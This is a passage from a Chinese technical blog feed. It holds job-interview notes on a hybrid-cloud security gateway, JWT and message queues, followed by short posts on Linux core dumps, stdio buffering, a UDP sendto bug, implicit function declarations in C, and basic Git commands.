<h2><span id="initramfs是什么">initramfs是什么</span></h2><p>initramfs是一个临时根文件系统, 用于内核启动初期提供必要驱动程序, 让内核能够挂载真正根文件系统<br>因为内核本身不会包含所有的驱动程序, 实际根文件系统可能位于复杂存储设备上(比如LVM), 这些设备需要特定驱动才能访问呢</p>
<h2><span id="怎么保证消息不丢失">怎么保证消息不丢失</span></h2><p>生产者角度</p>
<ul>
<li>要有重试机制; 云端在业务代码中判断超时后重试发送多次</li>
<li>另外有补偿机制, 将任务记录到数据库, 通过cronjob检查数据中未收到响应的任务, 进行补偿重试(重试3次, 每次间隔5分钟)<br>中间件角度</li>
<li>开启持久会话(cleanSession&#x3D;false), 客户端断开链接后, 消息也不会丢失</li>
<li>设置Qos 1(至少一次传递), 消息会被保留直到确认或超时<br>消费端角度</li>
<li>收到消息后并处理完成后, 发送ACK给消息队列, 让消息队列及时清除消息</li>
</ul>
<h2><span id="如何避免消息重复消费">如何避免消息重复消费</span></h2><p>幂等设计, 无论消息被处理多少次, 结果都是相同的<br>过期字典, 每次消费时先检查taskId是否在过期字典中; 如果ID存在说明消息重复; 否则消费消息之后，把taskId添加到过期字典。</p>
<h2><span id="如果升级版本有问题-怎么最小化用户影响">如果升级版本有问题, 怎么最小化用户影响</span></h2><p>设计灰度升级方案, 我们的服务网关部署在全球多个地区(比如日本,欧洲,新加坡)。<br>为了防止升级失败对所有客户造成影响, 我们首先选择客户较少的地区发布, 先指定少量客户升级(通过launchDarklyKey API), 再让整个地区的升级<br>对于有多台虚拟设备的客户, 也采用分批升级。 首次只升级一半设备, 等下一个周期后先判断这些设备是否升级成功, 如果升级成功再升级剩余一半</p>
<h2><span id="jwt注册流程">JWT注册流程</span></h2><ul>
<li>客户在UI上拿到一个由服务平台维护的register_token</li>
<li>用户在命令行中输入register_token注册，触发注册请求</li>
<li>虚拟设备通过POST请求将CPU,内存,IP信息连同register_token一起发送给后端</li>
<li>后端收到请求, 解析请求头的token, 验证token, 获取customerId</li>
<li>校验通过后, 后端为虚拟设备生成一个uuid, 用于唯一标识这台设备, 再生成一个applianceToken</li>
<li>后端把虚拟设备信息存到MySQL数据库, 把虚拟设备ID, Token, 还有消息队列的FQDN返回给虚拟设备</li>
<li>虚拟设备成功收到响应后，保存applianceId, applianceToken, 用于后续通信<br>每天定时从服务平台同步Token, Token设置了两个月过期时间, 过期前10天，立刻请求服务平台刷新Token</li>
</ul>
<h2><span id="jwt工作原理是什么">JWT工作原理是什么</span></h2><p>JWT用于身份认证, 通过签名确保数据完整性和真实性<br>由三部分组成, Header, Payload, Signature, 工作原理:</p>
<ul>
<li>用户登录成功后，服务器生成一个JWT返回给客户端</li>
<li>后续请求中, 客户端将JWT附加到HTTP请求头中, 发送给服务器</li>
<li>服务器接收到JWT后, 验证其签名和有效性<br>优点: </li>
<li>无状态, 服务器无需存储会话, 适合分布式系统</li>
<li>跨平台, JWT基于JSON格式, 易于解析使用, 支持多种编程语言<br>局限性:</li>
<li>无法主动失效</li>
</ul>
<h2><span id="jwt和session">JWT和Session</span></h2><p>JWT无状态的token, 服务端不需保存; Session是有状态的, 需要存储Session识别用户<br>JWT是无状态的，它更易于扩展, 但是难以撤销, 通常通过HTTP头传输， Session依赖于cookie传输Session ID</p>
<h2><span id="cookie和session认证问题">Cookie和Session认证问题</span></h2><p>1、用户向服务器发送用户名和密码。<br>2、服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。<br>3、服务器向用户返回一个 session_id，写入用户的 Cookie。<br>4、用户随后的每一次请求，都会通过 Cookie，将 session_id 传回服务器。<br>5、服务器收到 session_id，找到前期保存的数据，由此得知用户的身份。</p>
<h1><span id="简历中的技术名词">简历中的技术名词</span></h1><h2><span id="为什么采用混合云架构">为什么采用混合云架构?</span></h2><p>混合云指的是将私有云环境与公有云服务相结合的一种云计算模型，我们的服务网关采用了混合云架构, 由一个云端的管理平台和一组部署在客户本地的网关设备组成<br>在客户的私有云环境中, 我们通过Microk8s集群为客户终端提供服务, 减少了客户的公网带宽消耗<br>但是, 如果我们只有私有云, 网关设备的更新会变得难以实现，所以我们通过公有云上部署一个管理平台，实现网关设备的升级</p>
<h2><span id="microk8s集群是指什么-你们为什么不用高可用集群">Microk8s集群是指什么? 你们为什么不用高可用集群?</span></h2><p>我们的Microk8s集群是由多个独立运行的Microk8s示例组成的集群，每个节点处理各自终端的请求<br>没有使用高可用集群, 主要是几个方面考虑：<br>一个是实现的复杂性增加, 实现高可用集群, 需要引入额外的负载均衡器, 涉及到如何管理和部署这些LB, 还需要分配一个VIP, 增加了复杂性.<br>另一个是资源消耗, 高可用集群一般要求至少三个主节点以及多个工作节点, 消耗更多的资源, 以及更高的维护成本</p>
<h2><span id="如果是高可用集群-你准备怎么部署">如果是高可用集群, 你准备怎么部署?</span></h2><p>高可用集群, 需要部署至少三个主节点, 加上多个工作节点, 前置负载均衡器(LB), 负载均衡器可以使用HAProxy或者LVS<br>每个LB上配置keepalived管理VIP, 客户终端通过VIP访问服务网关</p>
<h2><span id="xdr是什么意思">XDR是什么意思</span></h2><p>Extended Detection and Response 扩展检测和响应，是一种安全解决方案。<br>它在EDR（端点检测与响应）的基础上进行了扩展，不仅关注端点的安全，还整合了网络、云端, 邮件等多个层面的数据进行威胁检测和响应, 为企业客户提供全面的安全防护</p>
<h2><span id="localactiveupdate">LocalActiveUpdate</span></h2><p>LAU是一种容器化的服务, 部署在我们的服务网关上, 为趋势科技的本地终端产品（如Apex One、DDI和DSM等）提供最新的威胁情报库更新。<br>LAU服务定期从云端服务器下载最新的病毒库和扫描引擎等组件, 把这些更新内容存储在本地服务器上，客户终端只需从本地获取更新, 这样大大减轻了网络负担</p>
<h2><span id="webreputation">WebReputation</span></h2><p>WebReputation是一个用于评估网页安全性的服务。 通过给访问的网站打分帮助用户避免安全威胁。<br>比如说，像Google, MS这样网站会给予高分, 并列入白名单; 恶意站点, 和白名单相似的可疑网站, 会给一个低分<br>这些数据来源于公司的爬虫服务, 还有从三方购买的一些数据</p>
<h2><span id="fps中-逐一为端点配置防火墙策略痛点指的是什么">FPS中, 逐一为端点配置防火墙策略痛点指的是什么</span></h2><p>客户必须在自己的防火墙上手动配置大量的云端服务URL, 使得本地终端产品能够连接到云端服务; 由于<br>客户的本地终端需要访问很多云端服务的URL, 客户环境中运行了大量的终端设备, 让客户为这些终端逐一指定防火墙策略是非常麻烦的,<br>而且万一配置出现遗漏, 本地终端发出恶意请求, 导致安全问题<br>解决方案: 通过FPS, 所有本地终端产品可以通过单一代理服务访问后端服务, 客户只需要在防火墙上配置允许通过FPS的URL规则, 无需为每个本地终端单独设置规则, 显著简化了防火墙策略配置工作量</p>
<h2><span id="air-gap是啥意思">Air Gap是啥意思</span></h2><p>对于银行这种敏感的客户, 其内部网络与外部网络之间是隔离的, 即所谓的Air Gap环境, 他们的终端设备无法直接连到外网<br>为了让这些终端也可以连到云，我们设计了Forward Proxy解决方案, 客户把我们的代理部署在DMZ区域, 让所有终端设备的出站请求都经过我们代理进行转发, 通过代理上云</p>
<h2><span id="什么是云计算">什么是云计算</span></h2><p>云计算是一种通过互联网提供计算资源和服务的技术, 允许用户按需访问和使用资源，无需购买维护硬件设备<br>为企业部署服务提供了灵活性, 可扩展性, 只需要为使用的资源付费, 降低成本</p>
<h2><span id="公有云和私有云">公有云和私有云</span></h2><p>公有云是由第三方云服务提供商提供的云计算环境, 比如AWS, Azure, 阿里云, 按需付费, 无需购买硬件设备，自建数据中心, 提高了部署的灵活性, 降低了成本<br>私有云是专门为单个组织构建的云计算环境, 位于组织的数据中心内，也可以托管给第三方服务商，使用VMware, Hyper-V实现资源虚拟化, 私有云适合那些对安全性要求较高的企业, 比如金融医疗行业</p>
<h2><span id="基础设施即服务iaas-平台即服务paas-软件即服务saas">基础设施即服务(IaaS), 平台即服务(PaaS),  软件即服务(SaaS)</span></h2><p>SaaS模式, 通过互联网我提供软件应用, 用户无需安装软件, 而是直接使用服务. 比如Office 365, 用户通过浏览器直接使用, 所有更新支持由微软提供<br>PaaS模式, 提供一个开发和部署环境, 用户需要关注自己业务逻辑, 开发应用软件, 但是无需关注底层硬件和操作系统<br>IaaS模式, 提供虚拟化计算资源, 用户需要自行管理OS, 中间件, 应用软件, 比如 Amazon EC2</p>
<h1><span id="云服务费用">云服务费用</span></h1><p><strong>DeployMent</strong><br>AWS云, 每个site一个EKS, site: US, EU, SG, AU, IN, JP, UAE<br><strong>Cost monthly</strong></p>
<ul>
<li>RDS 8500$</li>
<li>EC2 2500$</li>
<li>EKS cluster 140$</li>
<li>Load Balancer 133$</li>
<li>VPC 150$</li>
<li>Cloudwatch&#x2F;S3 300$</li>
<li>IOT 300$</li>
</ul>
]]></content>
      <categories>
        <category>interview</category>
      </categories>
      <tags>
        <tag>interview</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下生成core dump文件</title>
    <url>/2020/0228210741.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>Linux上运行C程序发生段错误后，没有core文件生成，调试不便。</p>
<span id="more"></span>

<h2><span id="生成core文件步骤">生成core文件步骤</span></h2><ol>
<li>敲ulimit -a，查看系统core文件大小限制，如第一行core file size值为0，表示没打开core文件设置<br><img data-src="/2020/0228210741/image1.png"></li>
<li>敲ulimit -c [kbytes], 设置系统允许生成的core文件大小, 如： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ulimit -c 1024        设置core文件最大为1024K</span><br><span class="line">ulimit -c unlimited   不限制core文件大小</span><br><span class="line">ulimit -c 0           不生成core文件</span><br></pre></td></tr></table></figure></li>
<li>运行C程序，段错误后，在当前目录生成core文件。<br><img data-src="/2020/0228210741/image2.png"></li>
</ol>
<p><strong>问题:</strong><br>多次运行程序发生段错误后，新生成的core文件会把旧的core文件覆盖，怎么区分并保留多个core文件?</p>
<p><strong>解决方法:</strong><br>敲 echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_uses_pid, 将每次产生的core文件的文件名中是否添加pid作为扩展。如果添加则文件内容为1，反之为0。<br><img data-src="/2020/0228210741/image3.png"><br>如上图，两次coredump后，会根据pid生成不同的core文件。</p>
<p><strong>指定core文件的输出格式和路径</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo /path/to/core.%t.%e.%p &gt; /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>标准IO库的缓冲模式</title>
    <url>/2020/0322220956.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>有时候，代码中明明执行了printf语句打印到终端，却没有看到输出的内容。</p>
<p>写文件的时候，明明成功执行了fwrite, fprintf语句，文件却没有写入相应的内容。</p>
<p>想搞清楚这些问题产生的原因，需要了解标准I&#x2F;O库的缓冲模式。</p>
<span id="more"></span>

<h2><span id="标准ix2fo与unbuffered-ix2fo">标准I&#x2F;O与unbuffered I&#x2F;O</span></h2><p>linux对I&#x2F;O文件操作分为不带缓存I&#x2F;O(unbuffered I&#x2F;O)和带缓存I&#x2F;O(即标准I&#x2F;O)</p>
<p>《APUE》中对术语unbuffered的定义: “The term <em>unbuffered</em> means that each read or write invokes a system call in the kernel”</p>
<p><a href="https://blog.csdn.net/qq_33366098/article/details/77923722">这篇文章</a>讲了unbuffered I&#x2F;O和标准I&#x2F;O的区别，以下引用其中的描述：</p>
<p>不带缓存I&#x2F;O，是指每次read, write都会进入内核，执行一次系统调用，不带缓存不是指直接对磁盘进行读写。比如read,write函数，它们属于系统调用，在用户态没有缓存，但是在内核是有缓存器的。如内核缓存未满，写入的数据还是在内核缓存，并没有真正写入硬盘。需要等待缓存写满或者内核需要重用该缓存以存放其他磁盘块数据时，才进行实际硬盘读写，这种方式被称为延迟写(delayed write)</p>
<p>带缓存I&#x2F;O也叫标准I&#x2F;O。标准I&#x2F;O会在用户态建立一个缓存区，以尽可能减少read和write调用的次数，提高效率。</p>
<p>unbuffered I&#x2F;O操作数据流向：数据-&gt;内核缓存区-&gt;磁盘</p>
<p>标准I&#x2F;O操作数据流向：数据-&gt;流缓存区-&gt;内核缓存区-&gt;磁盘</p>
<h2><span id="缓冲">缓冲</span></h2><p>标准I&#x2F;O库提供三种模式的缓冲: 全缓冲、行缓冲、不带缓冲</p>
<h3><span id="全缓冲fully-buffered">全缓冲(fully buffered)</span></h3><p>这种情况下，在填满标准I&#x2F;O缓冲区后才进行实际I&#x2F;O操作。对于驻留在磁盘上的文件通常用全缓冲。</p>
<h3><span id="行缓冲line-buffered">行缓冲(line buffered)</span></h3><p>这种情况下，当输入或输出遇到换行符，或者缓冲区已满时进行实际I&#x2F;O操作。当流涉及一个终端时，通常使用行缓冲。</p>
<h3><span id="不带缓冲unbuffered">不带缓冲(unbuffered)</span></h3><p>这种情况下，标准I&#x2F;O库不对字符进行缓冲存储。例如标准出错流stderr通常是不带缓冲的，这使得出错信息可以尽快显示。</p>
<h3><span id="注">注：</span></h3><p>1.这里的实际I&#x2F;O操作不是指读写硬盘操作，而是指执行read, write系统调用。</p>
<p>2.缓冲类型与具体的标准I&#x2F;O函数无关，与读写的文件类型有关。</p>
<h2><span id="举例说明">举例说明</span></h2><h3><span id="例1-全缓冲">例1 全缓冲</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">	char str[] = &quot;hello world&quot;;</span><br><span class="line">	FILE *fp = fopen(&quot;./text&quot;, &quot;w+&quot;);	// 省略了判空操作^_^</span><br><span class="line">	fprintf(fp, &quot;%s\n&quot;, str);</span><br><span class="line">    // fflush(fp);</span><br><span class="line">	for( ; ; ) &#123;</span><br><span class="line">		sleep(10);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译并运行程序，进入死循环后，观察text文件发现内容为空，hello world字符串并没有写入。</p>
<p>这是因为对于磁盘上的文件默认是全缓冲的。因为写入的字符串长度小于缓冲区大小(我的ubuntu机器上，为4096字节)，所以不会直接写入文件。</p>
<p>如需要立即输出，可以在for循环之前调用fflush函数，将缓冲区的内容写入磁盘。</p>
<p>这解释了为什么有时明明成功执行了fwrite,fprintf语句，文件却没有写入相应的内容。</p>
<h3><span id="例2-行缓冲">例2 行缓冲</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">	fprintf(stdout, &quot;hello world&quot;);</span><br><span class="line">	for( ; ; ) &#123;</span><br><span class="line">		sleep(10);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译并运行程序，发现终端没有输出，即使fprintf已经执行。</p>
<p>这是因为涉及终端的流默认是行缓冲的，当输入或输出遇到换行符时才进行实际I&#x2F;O操作。</p>
<p>如果需要执行fprintf后立即打印，只需在”hello world”后添加换行符’\n’</p>
<p>这个例子解释了为什么有时代码中执行了printf语句打印到终端，却没有看到输出的内容。</p>
<h3><span id="例3-无缓冲">例3 无缓冲</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">	fprintf(stderr, &quot;hello world&quot;);</span><br><span class="line">	for( ; ; ) &#123;</span><br><span class="line">		sleep(10);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译并运行程序,  终端立即输出hello world。可以看出标准错误是不带缓冲的。目的是使出错信息可以尽快显示。</p>
<h3><span id="例4-缓冲类型与读写的文件类型有关">例4 缓冲类型与读写的文件类型有关</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;sys/wait.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	pid_t pid;</span><br><span class="line">	printf(&quot;before fork\n&quot;);</span><br><span class="line"></span><br><span class="line">	if((pid = fork()) &lt; 0) &#123;	// fork失败直接返回-1</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125; else if(pid &gt; 0) &#123;		// 父进程</span><br><span class="line">		wait(NULL);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;pid = %d, hello\n&quot;, getpid());</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译并执行程序, 得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./a.out</span><br><span class="line">before fork</span><br><span class="line">pid = 6033, hello</span><br><span class="line">pid = 6032, hello</span><br><span class="line">$ ./a.out &gt; output.txt		#将输出重定向到output.txt文件</span><br><span class="line">$ cat output.txt</span><br><span class="line">before fork</span><br><span class="line">pid = 6077, hello</span><br><span class="line">before fork</span><br><span class="line">pid = 6076, hello</span><br></pre></td></tr></table></figure>

<p>发现两次输出的内容不同，将输出重定向到文件时，会多打印一行”before fork”，原因如下：</p>
<p><strong>如果标准输出连到终端设备，默认是行缓冲的</strong>。”before fork”只输出一次，原因是调用第一个printf后，标准输出缓冲区由换行符冲洗，“before fork”被立即打印。</p>
<p><strong>如果将标准输出重定向到文件，默认是全缓冲的</strong>。”befork fork”会输出两次，原因是调用第一个printf后数据“before fork”仍旧在缓冲区，然后调用fork函数，将父进程数据空间复制到子进程，此时该缓冲区也被复制到子进程。最后当父子进程终止时，各自冲洗其缓冲区的副本。</p>
<p>这个例子说明，缓冲类型与读写的文件类型有关，与具体I&#x2F;O函数无关。</p>
<h2><span id="参考资料">参考资料</span></h2><p>【1】<a href="https://blog.csdn.net/qq_33366098/article/details/77923722">https://blog.csdn.net/qq_33366098&#x2F;article&#x2F;details&#x2F;77923722</a><br>【2】<a href="https://www.yanbinghu.com/2019/12/01/27836.html">https://www.yanbinghu.com/2019/12/01/27836.html</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次UDP sendto函数错误解决</title>
    <url>/2020/0329142613.html</url>
    <content><![CDATA[<h3><span id="问题描述">问题描述</span></h3><p>在编写使用select函数的TCP和UDP回射程序，出现UDP的sendto错误，现象如下：</p>
<ul>
<li><p>服务端正常启动后，调用select函数监听TCP和UDP套接字, 可以正常处理TCP请求。</p>
</li>
<li><p>UDP客户端可以连接到服务端，但接收标准输入后无回显，阻塞于recvfrom。</p>
</li>
</ul>
<span id="more"></span>

<h3><span id="解决过程">解决过程</span></h3><p>经排查，发现服务端处理UDP请求的代码有问题，如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">SA</span>;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">udp_echo</span><span class="params">(<span class="type">int</span> udpfd)</span> &#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="type">char</span> recvline[MAXLINE];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cliaddr</span>;</span></span><br><span class="line">	<span class="type">socklen_t</span> len;</span><br><span class="line">	n = recvfrom(udpfd, recvline, MAXLINE, <span class="number">0</span>, (SA*)&amp;cliaddr, &amp;len);</span><br><span class="line">	sendto(udpfd, recvline, n, <span class="number">0</span>, (SA*)&amp;cliaddr, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>udp_echo函数，先用recvfrom读取UDP客户端发送的字符串，再使用sendto将该字符串送回客户端。代码中没有判断recvfrom, sendto函数的返回值，为了获取出错信息改写如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">udp_echo</span><span class="params">(<span class="type">int</span> udpfd)</span> &#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="type">char</span> recvline[MAXLINE];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cliaddr</span>;</span></span><br><span class="line">	<span class="type">socklen_t</span> len;</span><br><span class="line">	<span class="keyword">if</span>((n = recvfrom(udpfd, recvline, MAXLINE, <span class="number">0</span>, (SA*)&amp;cliaddr, &amp;len)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		err_sys(<span class="string">&quot;recvfrom error&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(sendto(udpfd, recvline, n, <span class="number">0</span>, (SA*)&amp;cliaddr, len) != n) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;error: %s\n&quot;</span>, strerror(errno));</span><br><span class="line">		err_sys(<span class="string">&quot;sendto error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再运行程序，输出如下:<br>$ error: Invalid argument<br>$ sendto error</p>
<p>错误原因在于cliaddr参数没有初始化。<strong>sockaddr_in结构体在使用之前，需要先使用bzero&#x2F;memset函数初始化为0</strong>，否则出现赋值不完整导致参数无效。</p>
<h4><span id="总结">总结：</span></h4><ul>
<li><p>变量使用之前最好初始化。</p>
</li>
<li><p>注意判断函数的返回值，可以使用包裹函数。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>隐式函数声明[-Wimplicit-function-declaration]</title>
    <url>/2020/0411143310.html</url>
    <content><![CDATA[<h2><span id="什么是隐式函数声明">什么是隐式函数声明</span></h2><p>C语言中，函数调用前不一定要声明。如果没有声明，编译器会自动按照一种隐式声明规则，为调用函数的C代码产生汇编代码。</p>
<span id="more"></span>

<h2><span id="忽略隐式函数声明警告的危害">忽略隐式函数声明警告的危害</span></h2><p>编译so库时会出现未定义符号，导致加载该so的程序执行出错。举例如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// add.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span> &#123; <span class="comment">// 调用add方法，求三数和</span></span><br><span class="line">	retunr <span class="title function_">ad</span><span class="params">(a, b)</span> + c; <span class="comment">// 这里本意调用add(a, b)，笔误写成ad(a, b)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将add.c编译成libadd.so，编译不报错，仅提示隐式函数声明警告，用ldd -r查看该so, 发现未定义符号ad。<br><img data-src="/2020/0411143310/image1.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ldd -r libadd.so</span><br><span class="line">undefined symbol: ad (./libadd.so)</span><br></pre></td></tr></table></figure>

<p>此时写一个main程序，调用libadd.so中的sum方法求三数之和</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译main程序出错，错误原因在于<strong>编写add.c时将符号add错写成了ad，由于忽视隐式函数声明警告，导致该错误没有在编译add.c的时候及时发现。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gcc main.c -L. -ladd</span><br><span class="line">./libadd.so: undefined reference to `ad&#x27;</span><br><span class="line">collect2: error: ld returned 1 exit status</span><br></pre></td></tr></table></figure>

<ul>
<li>对于用dlopen动态加载该so库的程序，如指定RTLD_NOW，dlopen立即失败；如指定RTLD_LAZY延迟绑定，则dlopen成功，但dlsym加载引用了未定义符号的函数(如sum函数)会出错，示例main程序如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">void</span> *handle = dlopen(<span class="string">&quot;./libadd.so&quot;</span>, RTLD_LAZY);</span><br><span class="line">	<span class="keyword">if</span>(handle == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>, dlerror());</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> (*add)(<span class="type">int</span>, <span class="type">int</span>);</span><br><span class="line">	<span class="type">int</span> (*sum)(<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>);</span><br><span class="line"></span><br><span class="line">	add = dlsym(handle, <span class="string">&quot;add&quot;</span>);	<span class="comment">// add方法正常执行</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1 + 2 = %d\n&quot;</span>, add(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">	sum = dlsym(handle, <span class="string">&quot;sum&quot;</span>);	<span class="comment">// 出错，报未定义符号ad</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1 + 2 + 3 = %d\n&quot;</span>, sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gcc main.c -ldl</span><br><span class="line">$ ./a.out</span><br><span class="line">1 + 2 = 3</span><br><span class="line">./a.out: symbol lookup error: ./libadd.so: undefined symbol: ad</span><br></pre></td></tr></table></figure>
<p>虽然编译成功，libadd.so可以加载，add函数可以执行，但执行sum函数时报未定义符号错。如及时处理隐式函数声明警告，可以在编译add.c的时候就发现该问题。</p>
<h2><span id="总结">总结</span></h2><ul>
<li><p>函数先声明再使用，包含必要的头文件。</p>
</li>
<li><p>重视编译器的隐式函数声明警告, 可开启-Werror选项检查, 不要简单使用-Wno忽略该编译告警。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>Git常用命令</title>
    <url>/2020/0502171005.html</url>
    <content><![CDATA[<h3><span id="0-git帮助">0. git帮助</span></h3><ul>
<li><p>git help命令</p>
</li>
<li><p>git原理和命令可参考《Pro Git》，中文版链接:<a href="https://www.progit.cn"> https://www.progit.cn</a></p>
</li>
</ul>
<span id="more"></span>

<h3><span id="1-git配置">1. git配置</span></h3><p>通过git config命令配置。–global选项指定读写的配置文件路径为~&#x2F;.gitconfig，只针对当前用户。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name  &quot;user&quot; 		  #设置用户名</span><br><span class="line">git config --global user.email &quot;user@163.com&quot; #设置邮箱</span><br><span class="line">git config --global core.editor emacs 		  #设置默认文本编译器为emacs</span><br><span class="line">git config --list 							  #检查所有git配置</span><br><span class="line">git config &lt;key&gt; 							  #检查git某一项配置，如user.name</span><br></pre></td></tr></table></figure>

<h4><span id="忽略文件-gitignore">忽略文件 —— .gitignore</span></h4><ul>
<li><p>.gitginore文件作用: 忽略无需纳入git管理的文件。</p>
</li>
<li><p>各种语言的.gitignore写法可参考: <a href="https://github.com/github/gitignore">https://github.com/github/gitignore</a></p>
</li>
</ul>
<h3><span id="2-获取与创建git仓">2. 获取与创建git仓</span></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init        		#将当前目录初始化为git仓</span><br><span class="line">git clone [url]  		#克隆现有仓库</span><br></pre></td></tr></table></figure>

<h3><span id="3-添加x2f删除文件">3. 添加&#x2F;删除文件</span></h3><h4><span id="跟踪文件">跟踪文件</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add &lt;file&gt;	 		#跟踪某个新文件，将内容从工作目录添加到暂存区</span><br><span class="line">git add .		 		#跟踪所有新文件</span><br></pre></td></tr></table></figure>

